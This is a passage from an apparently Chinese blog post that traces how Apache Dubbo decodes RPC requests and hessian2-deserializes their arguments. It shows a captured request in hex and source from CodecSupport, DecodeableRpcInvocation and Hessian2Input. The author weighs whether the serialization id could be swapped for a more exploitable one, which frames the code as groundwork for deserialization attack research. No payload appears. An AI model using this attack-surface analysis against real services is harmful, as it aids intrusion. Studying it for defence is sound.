<p>rpc tcp报文（hex）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">dabb c200 0000 0000 0000 0000 0000 0149</span><br><span class="line">0532 2e30 2e32 302c 636f 6d2e 7468 7265</span><br><span class="line">6564 7233 616d 2e6c 6561 726e 2e73 6572</span><br><span class="line">7665 722e 626f 6f74 2e44 656d 6f53 6572</span><br><span class="line">7669 6365 0331 2e30 0568 656c 6c6f 3024</span><br><span class="line">4c63 6f6d 2f74 6872 6565 6472 3361 6d2f</span><br><span class="line">6c65 6172 6e2f 7365 7276 6572 2f62 6f6f</span><br><span class="line">742f 413b 4330 2263 6f6d 2e74 6872 6565</span><br><span class="line">6472 3361 6d2e 6c65 6172 6e2e 7365 7276</span><br><span class="line">6572 2e62 6f6f 742e 4191 046e 616d 6560</span><br><span class="line">0678 7561 6e79 6848 0470 6174 6830 2c63</span><br><span class="line">6f6d 2e74 6872 6565 6472 3361 6d2e 6c65</span><br><span class="line">6172 6e2e 7365 7276 6572 2e62 6f6f 742e</span><br><span class="line">4465 6d6f 5365 7276 6963 651d 6163 7469</span><br><span class="line">7665 6c69 6d69 745f 6669 6c74 6572 5f73</span><br><span class="line">7461 7274 5f74 696d 650d 3135 3737 3038</span><br><span class="line">3332 3138 3432 3209 696e 7465 7266 6163</span><br><span class="line">6530 2c63 6f6d 2e74 6872 6565 6472 3361</span><br><span class="line">6d2e 6c65 6172 6e2e 7365 7276 6572 2e62</span><br><span class="line">6f6f 742e 4465 6d6f 5365 7276 6963 6507</span><br><span class="line">7665 7273 696f 6e03 312e 3007 7469 6d65</span><br><span class="line">6f75 7404 3330 3030 5a</span><br></pre></td></tr></table></figure></p>
<p>接着，直奔我们这次最最核心的地方，CodecSupport.deserialize，它封装了输入流对象，并通过SPI选择对应的反序列化实现，在decode解码输入流时，对其数据进行反序列化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static ObjectInput deserialize(URL url, InputStream is, byte proto) throws IOException &#123;</span><br><span class="line">    Serialization s = getSerialization(url, proto);</span><br><span class="line">    return s.deserialize(url, is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static Serialization getSerialization(URL url, Byte id) throws IOException &#123;</span><br><span class="line">    Serialization serialization = getSerializationById(id);</span><br><span class="line">    String serializationName = url.getParameter(Constants.SERIALIZATION_KEY, Constants.DEFAULT_REMOTING_SERIALIZATION);</span><br><span class="line">    // Check if &quot;serialization id&quot; passed from network matches the id on this side(only take effect for JDK serialization), for security purpose.</span><br><span class="line">    if (serialization == null</span><br><span class="line">            || ((id == 3 || id == 7 || id == 4) &amp;&amp; !(serializationName.equals(ID_SERIALIZATIONNAME_MAP.get(id))))) &#123;</span><br><span class="line">        throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return serialization;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到这里，我们其实已经了解服务提供者service暴露的大概源码细节了，我这边就不再跟进消费者refer服务以及invoke时的源码细节了，因为大体流程其实也差不了多远，下一节，我们将浅析反序列化部分的源码实现，也是我们主要的关注点。</p>
<h3 id="三、hessian2反序列化"><a href="#三、hessian2反序列化" class="headerlink" title="三、hessian2反序列化"></a>三、hessian2反序列化</h3><p>上一节中，我们最终跟到了DubboCodec的decodeBody方法实现，这个方法会对使用了dubbo协议的数据包进行解析，根据包数据，判断是请求还是响应，接着根据SPI选择反序列化实现进行反序列化。</p>
<p>在调用CodecSupport的deserialize方法时，我们可以看到它传入的第三个参数proto，这是从dubbo协议数据包的header部获取的数据，在header的19-23位，表示Serialization编号，在获取反序列化实现时，根据这个编号从ID_SERIALIZATION_MAP缓存中取出相应的反序列化实现</p>
<p>CodecSupport：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static Serialization getSerializationById(Byte id) &#123;</span><br><span class="line">    return ID_SERIALIZATION_MAP.get(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Serialization getSerialization(URL url, Byte id) throws IOException &#123;</span><br><span class="line">    Serialization serialization = getSerializationById(id);</span><br><span class="line">    String serializationName = url.getParameter(Constants.SERIALIZATION_KEY, Constants.DEFAULT_REMOTING_SERIALIZATION);</span><br><span class="line">    // Check if &quot;serialization id&quot; passed from network matches the id on this side(only take effect for JDK serialization), for security purpose.</span><br><span class="line">    if (serialization == null</span><br><span class="line">            || ((id == 3 || id == 7 || id == 4) &amp;&amp; !(serializationName.equals(ID_SERIALIZATIONNAME_MAP.get(id))))) &#123;</span><br><span class="line">        throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return serialization;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>那也就是说，我们是否可以随意修改数据包中的Serialization编号编号，选择更容易被利用的反序列化实现？</p>
<p>然而并不行，从上面代码，其实我们能看到有个if判断，如果编号为3、4、7或者编号取出的反序列化实现名称和服务提供者端配置的不一致，都会抛出异常。</p>
<p>而在缺省配置下，默认dubbo协议的反序列化，使用的是hessian2实现。</p>
<p>接着，跟进请求消息体的解码实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException &#123;</span><br><span class="line">    //...</span><br><span class="line">    if ((flag &amp; FLAG_REQUEST) == 0) &#123;</span><br><span class="line">        //...</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //...</span><br><span class="line">        try &#123;</span><br><span class="line">            //...</span><br><span class="line">            if (req.isHeartbeat()) &#123;</span><br><span class="line">                //...</span><br><span class="line">            &#125; else if (req.isEvent()) &#123;</span><br><span class="line">                //...</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //...</span><br><span class="line">                if (channel.getUrl().getParameter(</span><br><span class="line">                        Constants.DECODE_IN_IO_THREAD_KEY,</span><br><span class="line">                        Constants.DEFAULT_DECODE_IN_IO_THREAD)) &#123;</span><br><span class="line">                    inv = new DecodeableRpcInvocation(channel, req, is, proto);</span><br><span class="line">                    inv.decode();</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    //...</span><br><span class="line">                &#125;</span><br><span class="line">                //...</span><br><span class="line">            &#125;</span><br><span class="line">            //...</span><br><span class="line">        &#125; catch (Throwable t) &#123;</span><br><span class="line">            //...</span><br><span class="line">        &#125;</span><br><span class="line">        return req;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>DecodeableRpcInvocation.decode：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void decode() throws Exception &#123;</span><br><span class="line">    if (!hasDecoded &amp;&amp; channel != null &amp;&amp; inputStream != null) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            decode(channel, inputStream);</span><br><span class="line">        &#125; catch (Throwable e) &#123;</span><br><span class="line">            if (log.isWarnEnabled()) &#123;</span><br><span class="line">                log.warn(&quot;Decode rpc invocation failed: &quot; + e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">            request.setBroken(true);</span><br><span class="line">            request.setData(e);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            hasDecoded = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> @Override</span><br><span class="line">public Object decode(Channel channel, InputStream input) throws IOException &#123;</span><br><span class="line">    ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), serializationType)</span><br><span class="line">            .deserialize(channel.getUrl(), input);</span><br><span class="line">    //读取dubbo版本号</span><br><span class="line">    String dubboVersion = in.readUTF();</span><br><span class="line">    //设置dubbo版本号到请求对象中</span><br><span class="line">    request.setVersion(dubboVersion);</span><br><span class="line">    </span><br><span class="line">    setAttachment(Constants.DUBBO_VERSION_KEY, dubboVersion);</span><br><span class="line"></span><br><span class="line">    setAttachment(Constants.PATH_KEY, in.readUTF());</span><br><span class="line">    setAttachment(Constants.VERSION_KEY, in.readUTF());</span><br><span class="line"></span><br><span class="line">    //设置方法名到RpcInvocation中，用于指定调用的方法</span><br><span class="line">    setMethodName(in.readUTF());</span><br><span class="line">    try &#123;</span><br><span class="line">        Object[] args;</span><br><span class="line">        Class&lt;?&gt;[] pts;</span><br><span class="line">        //读取方法描述</span><br><span class="line">        String desc = in.readUTF();</span><br><span class="line">        if (desc.length() == 0) &#123;</span><br><span class="line">            pts = DubboCodec.EMPTY_CLASS_ARRAY;</span><br><span class="line">            args = DubboCodec.EMPTY_OBJECT_ARRAY;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //根据方法描述，加载入参class，存储成数组</span><br><span class="line">            pts = ReflectUtils.desc2classArray(desc);</span><br><span class="line">            args = new Object[pts.length];</span><br><span class="line">            for (int i = 0; i &lt; args.length; i++) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    //根据方法描述的class，反序列化读取入参对象</span><br><span class="line">                    args[i] = in.readObject(pts[i]);</span><br><span class="line">                &#125; catch (Exception e) &#123;</span><br><span class="line">                    if (log.isWarnEnabled()) &#123;</span><br><span class="line">                        log.warn(&quot;Decode argument failed: &quot; + e.getMessage(), e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        setParameterTypes(pts);</span><br><span class="line">        </span><br><span class="line">        //反序列化读取map集合，如果不为空，则全部数据放到attachment集合中</span><br><span class="line">        Map&lt;String, String&gt; map = (Map&lt;String, String&gt;) in.readObject(Map.class);</span><br><span class="line">        if (map != null &amp;&amp; map.size() &gt; 0) &#123;</span><br><span class="line">            Map&lt;String, String&gt; attachment = getAttachments();</span><br><span class="line">            if (attachment == null) &#123;</span><br><span class="line">                attachment = new HashMap&lt;String, String&gt;();</span><br><span class="line">            &#125;</span><br><span class="line">            attachment.putAll(map);</span><br><span class="line">            setAttachments(attachment);</span><br><span class="line">        &#125;</span><br><span class="line">        //decode argument ,may be callback</span><br><span class="line">        for (int i = 0; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = decodeInvocationArgument(channel, this, pts, i, args[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        setArguments(args);</span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        throw new IOException(StringUtils.toString(&quot;Read invocation data failed.&quot;, e));</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        if (in instanceof Cleanable) &#123;</span><br><span class="line">            ((Cleanable) in).cleanup();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体的消息体的组成结构为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.dubboVersion</span><br><span class="line">2.path</span><br><span class="line">3.version</span><br><span class="line">4.methodName</span><br><span class="line">5.methodDesc</span><br><span class="line">6.paramsObject</span><br><span class="line">7.map</span><br></pre></td></tr></table></figure></p>
<p>接着，跟进默认hessian2的反序列化实现，readObject中</p>
<p>com.alibaba.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readObject(java.lang.Class<t>)：</t></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">@SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException,</span><br><span class="line">        ClassNotFoundException &#123;</span><br><span class="line">    return (T) mH2i.readObject(cls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>readObject对mH2这个对象进行了封装，看Hessian2ObjectInput构造方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private final Hessian2Input mH2i;</span><br><span class="line"></span><br><span class="line">public Hessian2ObjectInput(InputStream is) &#123;</span><br><span class="line">    mH2i = new Hessian2Input(is);</span><br><span class="line">    mH2i.setSerializerFactory(Hessian2SerializerFactory.SERIALIZER_FACTORY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>封装的类对象为Hessian2Input，跟进Hessian2Input的readObject方法实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line">public Object readObject(Class cl) throws IOException &#123;</span><br><span class="line">    return this.readObject(cl, null, null);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public Object readObject(Class expectedClass, Class&lt;?&gt;... expectedTypes) throws IOException &#123;</span><br><span class="line">    if (expectedClass == null || expectedClass == Object.class)</span><br><span class="line">        return readObject();</span><br><span class="line"></span><br><span class="line">    int tag = _offset &lt; _length ? (_buffer[_offset++] &amp; 0xff) : read();</span><br><span class="line"></span><br><span class="line">    switch (tag) &#123;</span><br><span class="line">        case &apos;N&apos;:</span><br><span class="line">            return null;</span><br><span class="line"></span><br><span class="line">        case &apos;H&apos;: &#123;</span><br><span class="line">            Deserializer reader = findSerializerFactory().getDeserializer(expectedClass);</span><br><span class="line"></span><br><span class="line">            boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.length == 2;</span><br><span class="line">            // fix deserialize of short type</span><br><span class="line">            return reader.readMap(this</span><br><span class="line">                    , keyValuePair ? expectedTypes[0] : null</span><br><span class="line">                    , keyValuePair ? expectedTypes[1] : null);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case &apos;M&apos;: &#123;</span><br><span class="line">            String type = readType();</span><br><span class="line"></span><br><span class="line">            // hessian/3bb3</span><br><span class="line">            if (&quot;&quot;.equals(type)) &#123;</span><br><span class="line">                Deserializer reader;</span><br><span class="line">                reader = findSerializerFactory().getDeserializer(expectedClass);</span><br><span class="line"></span><br><span class="line">                return reader.readMap(this);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                Deserializer reader;</span><br><span class="line">                reader = findSerializerFactory().getObjectDeserializer(type, expectedClass);</span><br><span class="line"></span><br><span class="line">                return reader.readMap(this);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case &apos;C&apos;: &#123;</span><br><span class="line">            readObjectDefinition(expectedClass);</span><br><span class="line"></span><br><span class="line">            return readObject(expectedClass);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case 0x60:</span><br><span class="line">        case 0x61:</span><br><span class="line">        case 0x62:</span><br><span class="line">        case 0x63:</span><br><span class="line">        case 0x64:</span><br><span class="line">        case 0x65:</span><br><span class="line">        case 0x66:</span><br><span class="line">        case 0x67:</span><br><span class="line">        case 0x68:</span><br><span class="line">        case 0x69:</span><br><span class="line">        case 0x6a:</span><br><span class="line">        case 0x6b:</span><br><span class="line">        case 0x6c:</span><br><span class="line">        case 0x6d:</span><br><span class="line">        case 0x6e:</span><br><span class="line">        case 0x6f: &#123;</span><br><span class="line">            int ref = tag - 0x60;</span><br><span class="line">            int size = _classDefs.size();</span><br><span class="line"></span><br><span class="line">            if (ref &lt; 0 || size &lt;= ref)</span><br><span class="line">                throw new HessianProtocolException(&quot;&apos;&quot; + ref + &quot;&apos; is an unknown class definition&quot;);</span><br><span class="line"></span><br><span class="line">            ObjectDefinition def = (ObjectDefinition) _classDefs.get(ref);</span><br><span class="line"></span><br><span class="line">            return readObjectInstance(expectedClass, def);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case &apos;O&apos;: &#123;</span><br><span class="line">            int ref = readInt();</span><br><span class="line">            int size = _classDefs.size();</span><br><span class="line"></span><br><span class="line">            if (ref &lt; 0 || size &lt;= ref)</span><br><span class="line">                throw new HessianProtocolException(&quot;&apos;&quot; + ref + &quot;&apos; is an unknown class definition&quot;);</span><br><span class="line"></span><br><span class="line">            ObjectDefinition def = (ObjectDefinition) _classDefs.get(ref);</span><br><span class="line"></span><br><span class="line">            return readObjectInstance(expectedClass, def);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case BC_LIST_VARIABLE: &#123;</span><br><span class="line">            String type = readType();</span><br><span class="line"></span><br><span class="line">            Deserializer reader;</span><br><span class="line">            reader = findSerializerFactory().getListDeserializer(type, expectedClass);</span><br><span class="line"></span><br><span class="line">            Object v = reader.readList(this, -1);</span><br><span class="line"></span><br><span class="line">            return v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case BC_LIST_FIXED: &#123;</span><br><span class="line">            String type = readType();</span><br><span class="line">            int length = readInt();</span><br><span class="line"></span><br><span class="line">            Deserializer reader;</span><br><span class="line">            reader = findSerializerFactory().getListDeserializer(type, expectedClass);</span><br><span class="line"></span><br><span class="line">            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;</span><br><span class="line"></span><br><span class="line">            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);</span><br><span class="line"></span><br><span class="line">            return v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case 0x70:</span><br><span class="line">        case 0x71:</span><br><span class="line">        case 0x72:</span><br><span class="line">        case 0x73:</span><br><span class="line">        case 0x74:</span><br><span class="line">        case 0x75:</span><br><span class="line">        case 0x76:</span><br><span class="line">        case 0x77: &#123;</span><br><span class="line">            int length = tag - 0x70;</span><br><span class="line"></span><br><span class="line">            String type = readType();</span><br><span class="line"></span><br><span class="line">            Deserializer reader;</span><br><span class="line">            reader = findSerializerFactory().getListDeserializer(null, expectedClass);</span><br><span class="line"></span><br><span class="line">            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;</span><br><span class="line"></span><br><span class="line">            // fix deserialize of short type</span><br><span class="line">            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);</span><br><span class="line"></span><br><span class="line">            return v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case BC_LIST_VARIABLE_UNTYPED: &#123;</span><br><span class="line">            Deserializer reader;</span><br><span class="line">            reader = findSerializerFactory().getListDeserializer(null, expectedClass);</span><br><span class="line"></span><br><span class="line">            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;</span><br><span class="line"></span><br><span class="line">            // fix deserialize of short type</span><br><span class="line">            Object v = reader.readList(this, -1, valueType ? expectedTypes[0] : null);</span><br><span class="line"></span><br><span class="line">            return v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case BC_LIST_FIXED_UNTYPED: &#123;</span><br><span class="line">            int length = readInt();</span><br><span class="line"></span><br><span class="line">            Deserializer reader;</span><br><span class="line">            reader = findSerializerFactory().getListDeserializer(null, expectedClass);</span><br><span class="line"></span><br><span class="line">            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;</span><br><span class="line"></span><br><span class="line">            // fix deserialize of short type</span><br><span class="line">            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);</span><br><span class="line"></span><br><span class="line">            return v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case 0x78:</span><br><span class="line">        case 0x79:</span><br><span class="line">        case 0x7a:</span><br><span class="line">        case 0x7b:</span><br><span class="line">        case 0x7c:</span><br><span class="line">        case 0x7d:</span><br><span class="line">        case 0x7e:</span><br><span class="line">        case 0x7f: &#123;</span><br><span class="line">            int length = tag - 0x78;</span><br><span class="line"></span><br><span class="line">            Deserializer reader;</span><br><span class="line">            reader = findSerializerFactory().getListDeserializer(null, expectedClass);</span><br><span class="line"></span><br><span class="line">            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;</span><br><span class="line"></span><br><span class="line">            // fix deserialize of short type</span><br><span class="line">            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);</span><br><span class="line"></span><br><span class="line">            return v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case BC_REF: &#123;</span><br><span class="line">            int ref = readInt();</span><br><span class="line"></span><br><span class="line">            return _refs.get(ref);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (tag &gt;= 0)</span><br><span class="line">        _offset--;</span><br><span class="line"></span><br><span class="line">    // hessian/3b2i vs hessian/3406</span><br><span class="line">    // return readObject();</span><br><span class="line">    Object value = findSerializerFactory().getDeserializer(expectedClass).readObject(this);</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，其实现代码非常长，但是不难理解，hessian2的readObject反序列化，都是根据读到约定的字符tag，从而进行约定的数据读取处理</p>
<p>这样，根据我们抓包得到的序列化数据，我们就不难理解其结构组成了：</p>
